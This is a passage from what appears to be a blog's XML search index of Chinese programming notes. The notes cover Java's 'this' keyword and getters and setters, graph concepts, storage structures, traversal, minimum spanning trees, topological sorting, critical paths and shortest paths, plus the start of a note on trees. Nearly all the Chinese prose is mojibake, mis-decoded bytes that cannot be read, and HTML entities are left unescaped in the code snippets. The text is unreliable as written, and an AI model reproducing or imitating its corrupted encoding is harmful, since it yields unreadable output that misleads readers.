æ³•å¯¹å…¶ä¸­çš„å˜é‡è¿›è¡Œèµ‹å€¼ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¸ºTeacherç±»æž„é€ ä¸€ä¸ªæ–¹æ³•ï¼Œç„¶åŽåœ¨è¯¥æ–¹æ³•ä¸­è¿›è¡Œä¼ å‚ï¼Œèµ‹å€¼ã€‚ä½†æ˜¯é—®é¢˜æ¥äº†ï¼Œæˆå‘˜å˜é‡åå’Œå±€éƒ¨å˜é‡å(å‚æ•°)ç›¸åŒï¼Œèµ‹å€¼ä¸äº†ã€‚æ­¤æ—¶ç»™æˆå‘˜å˜é‡ååŠ ä¸Šthisçš„å‰ç¼€è¿›è¡ŒåŒºåˆ†ã€‚ 123456// åˆ›å»ºæž„é€ æ–¹æ³•ï¼Œä¸ºä¸Šé¢çš„3ä¸ªå±žæ€§èµ‹åˆå§‹å€¼public Teacher(String name,double salary,int age) &#123; this.name = name; // è®¾ç½®æ•™å¸ˆåç§° this.salary = salary; // è®¾ç½®æ•™å¸ˆå·¥èµ„ this.age = age; // è®¾ç½®æ•™å¸ˆå¹´é¾„&#125; å½“ä¸€ä¸ªç±»çš„å±žæ€§ï¼ˆæˆå‘˜å˜é‡ï¼‰åä¸Žè®¿é—®è¯¥å±žæ€§çš„æ–¹æ³•å‚æ•°åç›¸åŒæ—¶ï¼Œåˆ™éœ€è¦ä½¿ç”¨ this å…³é”®å­—æ¥è®¿é—®ç±»ä¸­çš„å±žæ€§ï¼Œä»¥åŒºåˆ†ç±»çš„å±žæ€§å’Œæ–¹æ³•ä¸­çš„å‚æ•°ã€‚ this.æ–¹æ³•åthis å¯ä»¥ä»£è¡¨ä»»ä½•å¯¹è±¡ï¼Œå½“ this å‡ºçŽ°åœ¨æŸä¸ªæ–¹æ³•ä½“ä¸­æ—¶ï¼Œå®ƒæ‰€ä»£è¡¨çš„å¯¹è±¡æ˜¯ä¸ç¡®å®šçš„ï¼Œä½†å®ƒçš„ç±»åž‹æ˜¯ç¡®å®šçš„ï¼Œå®ƒæ‰€ä»£è¡¨çš„åªèƒ½æ˜¯å½“å‰ç±»çš„å®žä¾‹ã€‚åªæœ‰å½“è¿™ä¸ªæ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œå®ƒæ‰€ä»£è¡¨çš„å¯¹è±¡æ‰è¢«ç¡®å®šä¸‹æ¥ï¼Œè°åœ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œthis å°±ä»£è¡¨è°ã€‚ å¯¹è±¡æ˜¯ä¸€ä¸ªç¡®å®šçš„å­˜åœ¨ 12345678910/** * ç¬¬äºŒç§å®šä¹‰Dogç±»æ–¹æ³• **/// å®šä¹‰ä¸€ä¸ªrun()æ–¹æ³•ï¼Œrun()æ–¹æ³•éœ€è¦å€ŸåŠ©jump()æ–¹æ³•public void run() &#123; // ä½¿ç”¨thiså¼•ç”¨è°ƒç”¨run()æ–¹æ³•çš„å¯¹è±¡ this.jump(); System.out.println(&quot;æ­£åœ¨æ‰§è¡Œrunæ–¹æ³•&quot;);&#125; åœ¨çŽ°å®žä¸–ç•Œé‡Œï¼Œå¯¹è±¡çš„ä¸€ä¸ªæ–¹æ³•ä¾èµ–äºŽå¦ä¸€ä¸ªæ–¹æ³•çš„æƒ…å½¢å¾ˆå¸¸è§ï¼Œä¾‹å¦‚ï¼Œåƒé¥­æ–¹æ³•ä¾èµ–äºŽæ‹¿ç­·å­æ–¹æ³•ï¼Œå†™ç¨‹åºæ–¹æ³•ä¾èµ–äºŽæ•²é”®ç›˜æ–¹æ³•ã€‚è¿™ç§ä¾èµ–éƒ½æ˜¯åŒä¸€ä¸ªå¯¹è±¡ä¸¤ä¸ªæ–¹æ³•ä¹‹é—´çš„ä¾èµ–ã€‚å› æ­¤ï¼ŒJava å…è®¸å¯¹è±¡çš„ä¸€ä¸ªæˆå‘˜ç›´æŽ¥è°ƒç”¨å¦ä¸€ä¸ªæˆå‘˜ï¼Œå¯ä»¥çœç•¥ this å‰ç¼€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå°†ä¸Šé¢çš„ run( ) æ–¹æ³•æ”¹ä¸ºå¦‚ä¸‹å½¢å¼ä¹Ÿå®Œå…¨æ­£ç¡®ã€‚ 1234public void run() &#123; jump(); System.out.println(&quot;æ­£åœ¨æ‰§è¡Œrunæ–¹æ³•&quot;);&#125; æ³¨æ„ï¼šå¯¹äºŽ static ä¿®é¥°çš„æ–¹æ³•è€Œè¨€ï¼Œå¯ä»¥ä½¿ç”¨ç±»æ¥ç›´æŽ¥è°ƒç”¨è¯¥æ–¹æ³•ï¼Œå¦‚æžœåœ¨ static ä¿®é¥°çš„æ–¹æ³•ä¸­ä½¿ç”¨ this å…³é”®å­—ï¼Œåˆ™è¿™ä¸ªå…³é”®å­—å°±æ— æ³•æŒ‡å‘åˆé€‚çš„å¯¹è±¡ã€‚æ‰€ä»¥ï¼Œstatic ä¿®é¥°çš„æ–¹æ³•ä¸­ä¸èƒ½ä½¿ç”¨ this å¼•ç”¨ã€‚å¹¶ä¸” Java è¯­æ³•è§„å®šï¼Œé™æ€æˆå‘˜ä¸èƒ½ç›´æŽ¥è®¿é—®éžé™æ€æˆå‘˜ã€‚ setteræ–¹æ³•å’Œgetteræ–¹æ³•ï¼š å‡ºäºŽå°è£…è€ƒè™‘ï¼ŒæŸäº›classçš„æˆå‘˜å˜é‡é€šå¸¸éƒ½å£°æ˜Žä¸ºprivateå˜é‡ï¼Œæ— æ³•ç›´æŽ¥è®¿é—®æ­¤å¯¹è±¡çš„privateå±žæ€§ï¼Œé€šå¸¸çš„åšæ³•å°±æ˜¯ï¼šä¸ºprivateçš„æˆå‘˜å˜é‡å£°æ˜Žpublicçš„è®¿é—®æŽ¥å£ï¼Œç§°ä¸ºsetteræ–¹æ³•ä¸Žgetteræ–¹æ³•ã€‚ setterï¼š å‘½åæ–¹æ³•ï¼šset+å˜é‡åï¼Œsuch as setName/setScoreï¼›setteræ–¹æ³•ç”¨äºŽèµ‹å€¼ï¼Œè¿”å›žç±»åž‹éƒ½ä¸ºvoid getterï¼š å‘½åæ–¹æ³•ï¼šget+å˜é‡åï¼Œsuch as getName/getScore ï¼›getteræ–¹æ³•ç”¨äºŽå–å€¼ï¼Œæ— éœ€è¾“å…¥å‚æ•°ï¼Œä½†æ˜¯è¿”å›žç±»åž‹ä¸€å®šæ˜¯è¯¥æˆå‘˜å˜é‡çš„æ•°æ®ç±»åž‹ã€‚]]></content>
  </entry>
  <entry>
    <title><![CDATA[å›¾]]></title>
    <url>%2F2019%2F11%2F21%2F%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[å›¾çš„åŸºæœ¬æ¦‚å¿µ é¡¶ç‚¹(vertex)ï¼šæ•°æ®å…ƒç´ ã€‚ç±»ä¼¼äºŽåœ¨çº¿æ€§è¡¨ä¸­ï¼šå…ƒç´ ï¼›æ ‘ä¸­ï¼šç»“ç‚¹ï¼› å›¾(Graph)ï¼šç”±é¡¶ç‚¹çš„æœ‰ç©·éžç©ºé›†åˆå’Œé¡¶ç‚¹ä¹‹é—´è¾¹çš„é›†åˆç»„æˆï¼Œé€šå¸¸è¡¨ç¤ºä¸ºG(V,E),Gè¡¨ç¤ºå›¾ï¼ŒVè¡¨ç¤ºé¡¶ç‚¹çš„é›†åˆï¼ŒEè¡¨ç¤ºè¾¹(edge)çš„é›†åˆã€‚ å­å›¾(Subgraph)ï¼šBå›¾çš„é¡¶ç‚¹å’Œè¾¹éƒ½å±žäºŽAå›¾ï¼Œåˆ™Bå›¾æ˜¯Aå›¾çš„å­å›¾ã€‚ è¾¹ï¼šé¡¶ç‚¹Viåˆ°é¡¶ç‚¹Vjä¹‹é—´çš„è¿žçº¿æ²¡æœ‰æ–¹å‘ï¼Œåˆ™ç§°è¿™æ¡è¿žçº¿ä¸ºè¾¹ã€‚ç”¨å°æ‹¬å·(Vi,Vj)æˆ–(Vj,Vi)è¡¨ç¤ºã€‚è‹¥æœ‰æ–¹å‘ï¼Œåˆ™ç§°ä¹‹ä¸ºå¼§(Arc)ï¼Œç”¨&lt;Vi,Vj&gt;è¡¨ç¤ºã€‚å…¶ä¸­Viæ˜¯å¼§å°¾ï¼ŒVjæ˜¯å¼§å¤´ã€‚ç®­å¤´å³å¼§å¤´ã€‚ å›¾ä¸­é¡¶ç‚¹ä¹‹é—´çš„è¿žçº¿å…¨æ˜¯æ²¡æœ‰æ–¹å‘çš„è¾¹ï¼Œåˆ™ç§°ä¹‹ä¸ºæ— å‘å›¾(Undirected graphs).é¡¶ç‚¹å…¨æ˜¯æœ‰æ–¹å‘çš„å¼§ï¼Œåˆ™å°†è¯¥ç§å›¾ç§°ä¹‹ä¸ºæœ‰å‘å›¾(Directed graphs)ã€‚ ç®€å•å›¾ï¼šä¸å­˜åœ¨é¡¶ç‚¹åˆ°å…¶è‡ªèº«çš„è¿žçº¿ï¼Œå¹¶ä¸”åŒä¸€æ¡è¿žçº¿ä¸é‡å¤å‡ºçŽ°ã€‚ å¯¹äºŽæ— å‘å›¾ï¼š é‚»æŽ¥ç‚¹ï¼šä¸Žè¯¥ç»“ç‚¹å­˜åœ¨è¾¹ç›¸å…³è”çš„ç‚¹ç§°ä¹‹ä¸ºé‚»æŽ¥ç‚¹ã€‚é¡¶ç‚¹çš„åº¦å°±æ˜¯ä¸Žè¯¥é¡¶ç‚¹ç›¸å…³è”çš„è¾¹çš„æ•°ç›®ã€‚ å¯¹äºŽæœ‰å‘å›¾ï¼š å­˜åœ¨å¼§&lt;Vi,Vj&gt;,åˆ™ç§°é¡¶ç‚¹Vié‚»æŽ¥åˆ°Vjï¼Œä»¥è¯¥é¡¶ç‚¹ä¸ºå¤´çš„å¼§çš„æ•°ç›®ç§°ä¸ºè¯¥é¡¶ç‚¹çš„å…¥åº¦(Indegree)ï¼Œåä¹‹ç§°ä¹‹ä¸ºå‡ºåº¦(Outdegree)ã€‚ è·¯å¾„ï¼šä»Žä¸€ä¸ªç‚¹åˆ°å¦ä¸€ä¸ªç‚¹æ‰€ç»è¿‡çš„é¡¶ç‚¹åºåˆ—ã€‚è·¯å¾„é•¿åº¦ï¼šè·¯å¾„ä¸Šçš„è¾¹æˆ–è€…å¼§çš„æ•°ç›®ã€‚ å›žè·¯æˆ–çŽ¯ï¼šè·¯å¾„ä¸­å‡ºå‘ç‚¹å’Œç»ˆæ­¢ç‚¹ä¸ºåŒä¸€ç‚¹ã€‚ ç®€å•å›žè·¯æˆ–ç®€å•çŽ¯ï¼šè·¯å¾„ä¸­å‡ºå‘ç‚¹ä¸Žç»ˆæ­¢ç‚¹ä¸ºåŒä¸€ç‚¹ï¼Œè€Œå…¶ä»–é¡¶ç‚¹äº’ä¸ç›¸åŒã€‚ ç®€å•è·¯å¾„ï¼šæ‰€æœ‰é¡¶ç‚¹éƒ½ä¸ç›¸åŒã€‚ è¿žé€šå›¾ï¼šä»Žé¡¶ç‚¹Viåˆ°é¡¶ç‚¹Vjå­˜åœ¨è·¯å¾„ï¼Œåˆ™ç§°Viåˆ°Vjæ˜¯è¿žé€šçš„ã€‚å¦‚æžœå›¾ä¸­ä»»æ„ä¸¤ä¸ªé¡¶ç‚¹éƒ½æ˜¯è¿žé€šçš„ï¼Œåˆ™ç§°å…¶ä¸ºè¿žé€šå›¾(Connected Graph)ã€‚ è¿žé€šåˆ†é‡ï¼šæžå¤§è¿žé€šå­å›¾ã€‚ å¼ºè¿žé€šå›¾ï¼šä»ŽViåˆ°Vjï¼Œä»¥åŠä»ŽVjåˆ°Viï¼Œéƒ½å­˜åœ¨è·¯å¾„ï¼Œåˆ™ç§°è¯¥å›¾ä¸ºå¼ºè¿žé€šå›¾ã€‚ ç”Ÿæˆæ ‘ï¼šè¿žæŽ¥nä¸ªç»“ç‚¹çš„n-1æ¡è¾¹å½¢æˆçš„æ‰€æžå°è¿žé€šå­å›¾ã€‚æœ‰å‘å›¾ä¸­çš„æžå¤§å¼ºè¿žé€šå­å›¾ç§°ä¸ºæœ‰å‘å›¾çš„å¼ºè¿žé€šåˆ†é‡ã€‚æœ‰å‘å›¾ä¸­è‹¥å¹²æ£µæœ‰å‘æ ‘è¿žæŽ¥nä¸ªç»“ç‚¹ï¼Œä¸”æ€»å…±æœ‰n-1æ¡å¼§ï¼Œæž„æˆäº†ç”Ÿæˆæ£®æž—ã€‚ æ— å‘å›¾ä¸­ï¼Œå¦‚æžœä»»æ„ä¸¤ä¸ªé¡¶ç‚¹ä¹‹é—´éƒ½å­˜åœ¨è¾¹ï¼Œåˆ™ç§°è¯¥å›¾ä¸ºæ— å‘å®Œå…¨å›¾ã€‚æœ‰å‘å›¾ä¸­ï¼Œä»»æ„ä¸¤ä¸ªé¡¶ç‚¹ä¹‹é—´éƒ½å­˜åœ¨äº’ä¸ºç›¸åçš„ä¸¤æ¡å¼§ï¼Œåˆ™ç§°è¯¥å›¾ä¸ºæœ‰å‘å®Œå…¨å›¾ã€‚ ä¸ç®¡æ˜¯æœ‰å‘å›¾è¿˜æ˜¯æ— å‘å›¾ï¼Œè¾¹/å¼§æ¯”è¾ƒå°‘æ—¶ï¼Œç§°ä¹‹ä¸ºç¨€ç–å›¾ï¼Œåä¹‹ç§°ä¹‹ä¸ºç¨ å¯†å›¾ã€‚ æƒ(Weight)ï¼šå®žé™…åº”ç”¨æ—¶ï¼Œå›¾çš„è¾¹/å¼§å¾€å¾€æ˜ å°„ä¸ºçŽ°å®žä¸­æŸä¸ªå…·ä½“çš„ä¿¡æ¯ï¼Œé™„å¸¦ç›¸å…³çš„æ•°å­—å€¼ï¼Œè¿™ç§ä¸Žå›¾çš„è¾¹/å¼§ç›¸å…³è”çš„æ•°å­—çš„å€¼ç§°ä¹‹ä¸ºæƒã€‚å¸¦æƒçš„å›¾ç§°ä¹‹ä¸ºç½‘(Network)ã€‚ å›¾çš„å­˜å‚¨ç»“æž„é‚»æŽ¥çŸ©é˜µè¡¨ç¤ºæ³•ï¼šå°†é¡¶ç‚¹ä¸Žè¾¹/å¼§åˆ†åˆ«ç”¨ä¸¤ä¸ªç»“æž„æ¥è¿›è¡Œå­˜å‚¨ï¼Œå¹¶ä¸”ä»Žä¸­å»ºç«‹å…³è”ã€‚é‚»æŽ¥çŸ©é˜µè¡¨ç¤ºæ³•ç”¨ä¸¤ä¸ªæ•°ç»„æ¥è¡¨ç¤ºå›¾ï¼Œä¸€ä¸ªä¸€ç»´æ•°ç»„ç”¨äºŽå­˜å‚¨å›¾ä¸­çš„é¡¶ç‚¹ä¿¡æ¯(å­˜å‚¨é¡ºåºä½“çŽ°å‡ºç»“ç‚¹çš„ç¼–å·é¡ºåº)ï¼Œä¸€ä¸ªäºŒç»´æ•°ç»„(ç§°ä¹‹ä¸ºé‚»æŽ¥çŸ©é˜µ)ç”¨äºŽå­˜å‚¨å›¾ä¸­è¾¹/å¼§çš„ä¿¡æ¯ã€‚ arc=â‘ 1ï¼Œè‹¥è¯¥è¾¹/å¼§å­˜åœ¨ã€‚â‘¡0ï¼Œåä¹‹ã€‚ æ˜“çŸ¥ï¼Œæ— å‘å›¾çš„è¾¹æ•°ç»„å…¶å®žæ˜¯ä¸€ä¸ªåŸºäºŽä¸»å¯¹è§’çº¿çš„å¯¹ç§°çŸ©é˜µï¼Œç¼–å·ä¸ºiçš„é¡¶ç‚¹çš„åº¦ï¼Œç­‰äºŽç¬¬iè¡Œæˆ–iåˆ—ä¸­éž0å…ƒçš„ä¸ªæ•°ã€‚æœ‰å‘å›¾çš„å¼§æ•°ç»„ä¸å†æ˜¯å¯¹ç§°çŸ©é˜µï¼Œè€Œä¸”ç¬¬iè¡Œçš„éž0å…ƒä¸ªæ•°è¡¨ç¤ºç¼–å·ä¸ºiçš„é¡¶ç‚¹çš„å‡ºåº¦ï¼Œç¬¬iåˆ—çš„éž0å…ƒä¸ªæ•°è¡¨ç¤ºç¼–å·ä¸ºiçš„é¡¶ç‚¹çš„å…¥åº¦ï¼Œæ•´ä¸ªçŸ©é˜µçš„éž0å…ƒä¸ªæ•°ç­‰äºŽå¼§çš„æ€»æ•°ã€‚ ä½¿çŸ©é˜µèƒ½å¤Ÿè¡¨ç¤ºå‡ºå¸¦æƒå€¼çš„ç½‘ï¼Œå¯å°†æƒå€¼ä»£æ›¿åŽŸçŸ©é˜µä¸­çš„1. 12345678å›¾çš„é‚»æŽ¥çŸ©é˜µå­˜å‚¨ç»“æž„#define maxvex 100typedef struct&#123;char vexs[maxvex];int arc[maxvex][maxvex];int vertex,edges;&#125;MGraph; é‚»æŽ¥è¡¨è¡¨ç¤ºæ³•ï¼šç¬¬ä¸€éƒ¨åˆ†ï¼Œç”¨ä¸€ä¸ªä¸€ç»´æ•°ç»„æ¥å­˜å‚¨æ‰€æœ‰é¡¶ç‚¹çš„å€¼ã€‚ç¬¬äºŒéƒ¨åˆ†ï¼Œå¤šä¸ªå•é“¾è¡¨ã€‚å°†è¯¥ç»“ç‚¹(ä¸€ç»´æ•°ç»„ä¸­çš„å…ƒç´ )å¼§å°¾å¯¹åº”çš„å¼§å¤´å­˜å‚¨åœ¨é“¾è¡¨ä¸­çš„dataåŸŸã€‚ æ— å‘å›¾çš„è¡¨ç¤ºæ–¹æ³•ä¸Žæœ‰å‘å›¾å‡ ä¹Žå®Œå…¨ç›¸åŒï¼Œä½†æ˜¯å•é“¾è¡¨ç»“ç‚¹æ•°ç¿»å€(ä¸€æ¡è¾¹è§†ä¸ºä¸¤æ¡å¼§)ã€‚å¯¹äºŽå¸¦æƒå€¼çš„ç½‘ï¼Œå¯ä»¥åœ¨é“¾è¡¨ä¸­åŠ å…¥ä¸€ä¸ªå­˜æ”¾æƒå€¼çš„åŸŸã€‚ é‚»æŽ¥è¡¨çš„ä¼˜ç‚¹åœ¨äºŽæ ¹æ®å®žé™…çš„è¾¹/å¼§æ•°ç›®åŠ¨æ€ç¡®å®šå­˜å‚¨ç»“æž„(å¤šä¸ªå•é“¾è¡¨)ï¼Œé¿å…äº†å­˜å‚¨ç©ºé—´çš„æµªè´¹ã€‚æœ‰å‘å›¾ä¸­å¾ˆå®¹æ˜“ç¡®å®šè¯¥é¡¶ç‚¹çš„å‡ºåº¦(æ±‚å‡ºå•é“¾è¡¨è¡¨é•¿)ï¼Œæ— å‘å›¾ä¸­è¡¨é•¿å°±æ˜¯é¡¶ç‚¹çš„å‡ºåº¦ã€‚ç¼ºç‚¹åœ¨äºŽåœ¨æœ‰å‘å›¾ä¸­è¦èŽ·å–é¡¶ç‚¹içš„å…¥åº¦éžå¸¸éº»çƒ¦ï¼Œéœ€è¦éåŽ†å‡ºé“¾è¡¨ä¸­æœ‰å¤šå°‘é“¾è¡¨ä¸­dataåŸŸä¸ºiã€‚ äºŽæ˜¯å‡ºçŽ°é€†é‚»æŽ¥è¡¨è¡¨ç¤ºæ–¹æ³•ï¼šå°†é“¾è¡¨ä¸­çš„dataåŸŸå­˜æ”¾æŒ‡å‘å½“å‰é¡¶ç‚¹çš„å¼§çš„å¼§å°¾ç¼–å·ã€‚è¿™æ ·èŽ·å–å…¥åº¦éžå¸¸ç®€å•(åŒæ—¶èŽ·å–å‡ºåº¦å¾ˆéš¾)ã€‚ åå­—é“¾è¡¨è¡¨ç¤ºæ–¹æ³•ï¼šç•¥ã€‚ å›¾çš„éåŽ†Traversing Graphæ·±åº¦ä¼˜å…ˆéåŽ†(Depth_First_Search,DFS)å¾ˆéš¾ç”¨è¨€è¯­è¡¨è¾¾æ¸…æ¥šï¼Œä½ æ‡‚çš„ï¼Œç±»ä¼¼äºŽæ ‘çš„å…ˆåºéåŽ†ã€‚å…ˆä¸€æ¡é“èµ°åˆ°é»‘ï¼Œå†ä¸€æ­¥ä¸€æ­¥å¾€å›žèµ°çœ‹æ˜¯å¦æœ‰åˆ«çš„è·¯å¾„ã€‚å› ä¸ºå¯èƒ½å­˜åœ¨å¤šä¸ªç¬¦åˆæ¡ä»¶çš„é‚»æŽ¥ç‚¹ï¼Œæ‰€ä»¥å›¾çš„æ·±åº¦ä¼˜å…ˆéåŽ†åºåˆ—æ˜¯ä¸å”¯ä¸€çš„ã€‚ å¹¿åº¦ä¼˜å…ˆéåŽ†(Breadth First Searchï¼ŒBFS)â‘ è®¿é—®ä»»æ„ä¸€ä¸ªé¡¶ç‚¹ã€‚â‘¡è®¿é—®è¯¥é¡¶ç‚¹æ‰€æœ‰çš„é‚»æŽ¥ç‚¹ã€‚â‘¢è®¿é—®è¯¥é¡¶ç‚¹çš„æ‰€æœ‰é‚»æŽ¥ç‚¹çš„æ‰€æœ‰é‚»æŽ¥ç‚¹ã€‚â‘£â€¦â€¦ æ‰¾å‡ºå½“å‰é‚»æŽ¥ç‚¹çš„æ‰€æœ‰å¤–ä¸€å±‚é‚»æŽ¥ç‚¹ï¼ŒåŽæŒ‰ä»»æ„åºåˆ—è¿›è¡ŒéåŽ†ã€‚ æœ€å°ç”Ÿæˆæ ‘nä¸ªé¡¶ç‚¹ï¼Œç”¨n-1æ¡è¾¹æŠŠä¸€ä¸ªè¿žé€šå›¾è¿žæŽ¥èµ·æ¥ï¼Œå¹¶ä½¿å¾—æƒå€¼ä¹‹å’Œæœ€å°ã€‚æœ‰Primç®—æ³•ä¸ŽKruskalç®—æ³•ã€‚æ³¨æ„æœ€å°ç”Ÿæˆæ ‘ä¸ŽéåŽ†æ˜¯ä¸ä¸€æ ·çš„ï¼Œå¯»æ‰¾æœ€å°ç”Ÿæˆæ ‘æ—¶ï¼Œä¸è¦æ±‚ä¸Šä¸€æ­¥ä¸Žä¸‹ä¸€æ­¥ä¹‹é—´è¿žç»­ã€‚ Primç®—æ³•ï¼šè§‚å¯Ÿç¬¦åˆæ¡ä»¶çš„é‚£äº›è¾¹ï¼Œ(è¾¹çš„ä¸€ä¸ªç«¯ç‚¹æ˜¯ç°è‰²ï¼Œå¦ä¸€ä¸ªç«¯ç‚¹æ˜¯ç™½è‰²)ï¼Œå¹¶é€‰å‡ºå…¶ä¸­æƒå€¼æœ€å°çš„ä¸€æ¡ã€‚ä¸Žè¾¹æ•°ç›®æ— å…³ï¼Œåªä¸Žé¡¶ç‚¹ä¸ªæ•°æœ‰å…³ï¼Œé€‚ç”¨äºŽç¨ å¯†å›¾ã€‚(ç¨€ç–å›¾äº¦å¯)ã€‚ Kruskalç®—æ³•ï¼šä¸€å¥è¯ï¼Œâ€ä¸æž„æˆçŽ¯çš„æƒ…å†µä¸‹ï¼Œé€‰æƒå€¼æœ€å°çš„è¾¹ã€‚â€œä¸Žè¾¹æ•°ç›®æœ‰å…³ï¼Œä¸Žé¡¶ç‚¹ä¸ªæ•°æ— å…³ï¼Œé€‚ç”¨äºŽç¨€ç–å›¾ã€‚ AOVç½‘ï¼šç”¨é¡¶ç‚¹è¡¨ç¤ºæ´»åŠ¨ï¼Œå¼§è¡¨ç¤ºæ´»åŠ¨çš„ä¼˜å…ˆå…³ç³»çš„æœ‰å‘å›¾ç§°ä¸ºAOVç½‘ã€‚å¼§è¡¨ç¤ºæ´»åŠ¨ä¹‹é—´çš„æŸç§å›ºæœ‰çš„åˆ¶çº¦å…³ç³»ã€‚ æ‹“æ‰‘åºåˆ—ï¼šå‡è®¾æ´»åŠ¨Viæ˜¯æ´»åŠ¨Vjçš„å‰é©±æ´»åŠ¨ï¼Œåˆ™åœ¨é¡¶ç‚¹åºåˆ—ä¸­é¡¶ç‚¹Viå¿…å®šåœ¨é¡¶ç‚¹Vjçš„å‰é¢ã€‚æ»¡è¶³è¿™æ ·çš„æ¡ä»¶ï¼Œåˆ™ç§°è¿™æ ·çš„é¡¶ç‚¹åºåˆ—ä¸ºä¸€ä¸ªæ‹“æ‰‘åºåˆ—ã€‚ æ‹“æ‰‘æŽ’åºï¼šæž„é€ æ‹“æ‰‘åºåˆ—çš„è¿‡ç¨‹ã€‚ æ‹“æ‰‘æŽ’åºçš„æ–¹æ³•ï¼šæ¯æ¬¡ä»ŽAOVç½‘ä¸­é€‰æ‹©ä¸€ä¸ªå…¥åº¦ä¸º0çš„é¡¶ç‚¹ï¼Œè¾“å‡ºï¼Œç„¶åŽåˆ åŽ»æ­¤é¡¶ç‚¹åŠæ‰€æœ‰ä¸Žä»–ç›¸å…³çš„å¼§ã€‚é‡å¤ä¸Šè¿°æ“ä½œç›´åˆ°ï¼Œè¾“å‡ºå…¨éƒ¨çš„é¡¶ç‚¹ï¼Œæˆ–è€…AOVç½‘ä¸­æ‰¾ä¸åˆ°å…¥åº¦ä¸º0çš„é¡¶ç‚¹ã€‚ AOEç½‘ï¼šå¼§è¡¨ç¤ºæ¯ä¸ªæ­¥éª¤çŽ¯èŠ‚çš„æ´»åŠ¨ï¼Œé¡¶ç‚¹è¡¨ç¤ºæ­¥éª¤çŽ¯èŠ‚å¼€å§‹æ—¶æˆ–è€…ç»“æŸæ—¶çš„çŠ¶æ€ï¼Œæƒå€¼è¡¨ç¤ºè¯¥æ´»åŠ¨è¿›è¡Œæ‰€éœ€è¦çš„æ—¶é—´ï¼Œæž„æˆçš„å¼§è¡¨ç¤ºæ´»åŠ¨çš„æœ‰å‘æ— çŽ¯å›¾ç§°ä¸ºAOEç½‘ã€‚ä¸»è¦ç”¨äºŽè§£å†³æ—¶é—´ä¸Šçš„ä¸€äº›ç›¸å…³é—®é¢˜ã€‚æ­¤å¤„å¸¸ç”¨åˆ°é¡¶ç‚¹iæœ€æ—©å‘ˆçŽ°æ—¶é—´ve(i),é¡¶ç‚¹iæœ€æ™šå‘ˆçŽ°æ—¶é—´vl(i)ã€‚ ç”±äºŽåœ¨AOEç½‘ä¸­ï¼Œæ´»åŠ¨å¯ä»¥å¹¶è¡Œåœ°è¿›è¡Œï¼Œæ‰€ä»¥å®Œæˆå·¥ç¨‹çš„æœ€çŸ­æ—¶é—´æ˜¯ä»Žå§‹ç‚¹åˆ°ç»ˆç‚¹çš„æœ€é•¿è·¯å¾„çš„æœ€çŸ­é•¿åº¦(æƒå€¼ä¹‹å’Œ)ã€‚è·¯å¾„é•¿åº¦æœ€é•¿çš„è·¯å¾„å«åšå…³é”®è·¯å¾„ã€‚æœ€é•¿è·¯å¾„å¹¶ä¸è¿½æ±‚æœ€é•¿ï¼Œåè€Œæ˜¯ä¿è¯æ‰€æœ‰æ´»åŠ¨å®Œæˆçš„æœ€çŸ­ã€‚ ve(i)ç­‰äºŽä»Žå‡ºå‘ç‚¹åˆ°å½“å‰ç‚¹içš„æœ€é•¿è·¯å¾„çš„é•¿åº¦(æ»¡è¶³æ‰€æœ‰çŠ¶æ€è€Œéžä¸€ä¸ªçŠ¶æ€)ã€‚ vl(i)ç­‰äºŽæ€»å·¥æœŸä¸Žä»Žå½“å‰ç‚¹åˆ°ç»ˆç‚¹çš„æœ€é•¿è·¯å¾„çš„å·®å€¼(åŽé¢éƒ½æ˜¯ç†æƒ³çŠ¶æ€ï¼Œé¢„ç•™ç»™å‰é¢çš„æœ€å¤šæ—¶é—´)ã€‚ ve(i)=vl(i)ï¼Œé¡¶ç‚¹iç§°ä¸ºå…³é”®ç‚¹ï¼Œè¯¥æ´»åŠ¨ç§°ä¸ºå…³é”®æ´»åŠ¨ã€‚ æœ€çŸ­è·¯å¾„ï¼šæŒ‡çš„æ˜¯ä¸¤ä¸ªé¡¶ç‚¹ä¹‹é—´ç»è¿‡çš„è¾¹/å¼§ä¸Šæƒå€¼æœ€å°çš„è·¯å¾„ã€‚ å…·ä½“æ“ä½œï¼š ä¸‰è¡Œè¡¨ï¼Œiä¸ºç»™é¡¶ç‚¹çš„åºå·ï¼ŒD[i]è¡¨ç¤ºæƒå€¼ï¼Œæœ€åŽä¸€è¡Œä¸ºè·¯å¾„ã€‚ åˆå§‹åŒ–å°†æºç‚¹å¯åˆ°çš„é¡¶ç‚¹çš„æƒå€¼å†™ä¸‹ã€‚ â‘ å°†è½è„šç‚¹æ ‡ç°ï¼ˆD[i]æœ€å°çš„ç‚¹ï¼‰ â‘¡ä¿®æ­£é‚»æŽ¥è½è„šç‚¹çš„ç‚¹çš„è·¯å¾„ä¸ŽD[i]]]></content>
      <tags>
        <tag>Data Structure</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tree]]></title>
    <url>%2F2019%2F11%2F17%2FTree%2F</url>
    <content type="text"><![CDATA[[TOC] æ ‘(tree)ä¸€ï¼šæ ‘çš„ç›¸å…³åŸºæœ¬æ¦‚å¿µï¼š æ ‘æ˜¯nä¸ªèŠ‚ç‚¹çš„æœ‰é™é›†(n&gt;=0)ï¼Œå½“n=1æ—¶ï¼Œè¯¥å…ƒç´ å°±ç§°ä¸ºæ ‘çš„æ ¹èŠ‚ç‚¹ï¼Œå½“n&gt;1æ—¶ï¼Œå…¶ä»–èŠ‚ç‚¹å¯åˆ†ä¸ºmä¸ªéžç©ºä¸”ä¸ç›¸äº¤çš„æœ‰é™é›†ç§°ä¸ºå­æ ‘(SubTree)ã€‚ æ ‘çš„èŠ‚ç‚¹åŒ…å«ä¸€ä¸ªæ•°æ®å…ƒç´ ä»¥åŠè‹¥å¹²æŒ‡å‘å­æ ‘çš„åˆ†æ”¯ï¼ŒèŠ‚ç‚¹æ‹¥æœ‰çš„å­æ ‘ä¸ªæ•°ç§°ä¸ºèŠ‚ç‚¹çš„åº¦(Degree),åº¦ä¸º0çš„èŠ‚ç‚¹ç§°ä¸ºå¶å­(Leaf)æˆ–ç»ˆç«¯èŠ‚ç‚¹ï¼Œåº¦ä¸ä¸ºé›¶çš„èŠ‚ç‚¹ç§°ä¸ºéžç»ˆç«¯èŠ‚ç‚¹/åˆ†æ”¯èŠ‚ç‚¹ã€‚ ä¸€æ£µæ 